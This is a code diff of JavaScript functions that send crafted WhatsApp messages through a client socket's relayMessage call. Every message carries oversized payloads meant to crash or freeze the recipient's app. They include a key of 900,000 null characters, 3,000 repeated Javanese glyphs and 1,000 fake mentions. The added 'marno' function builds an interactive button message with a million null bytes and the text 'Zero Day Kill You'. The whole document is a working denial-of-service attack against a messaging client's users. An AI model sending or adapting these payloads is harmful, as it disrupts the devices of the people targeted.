@@ -53,7 +53,7 @@ async function DelayCresX7(sock, jid) {
       "pix_static_code": {
         "merchant_name": "X7${'ꦾ'.repeat(3000)}",
         "key": "${'\u0000'.repeat(900000)}",
-        "key_type": "AsepX7"
+        "key_type": "Zero"
       }
     },
     {
@@ -72,7 +72,7 @@ async function DelayCresX7(sock, jid) {
         ]
       },
       contextInfo: {
-        stanzaId: "ExplostX7",
+        stanzaId: "zeroday",
         mentionedJid: Array.from({ length: 1000 }, (_, i) => `6281${i}@s.whatsapp.net`),
         forwardingScore: 999999999,
         isForwarded: true
@@ -83,6 +83,29 @@ async function DelayCresX7(sock, jid) {
   await sock.relayMessage(jid, msg, { participant: { jid: jid } })
 }
 
-try {
-  await DelayCresX7(sock, jid);
-} catch {}
+async function marno(sock, jid) {
+    const msg = {
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: "Zero Day Kill You",
+                    },
+                    footer: {
+                        text: "Zero Day Kill You"
+                    },
+                    nativeFlowMessage: {
+                        buttons: [{
+                            name: "single_select",
+                            buttonParamsJson: "\0".repeat(1000000)
+                        }]
+                    }
+                }
+            }
+        }
+    };
+
+    await sock.relayMessage(jid, msg, {
+        participant: { jid: jid }
+    })
+}
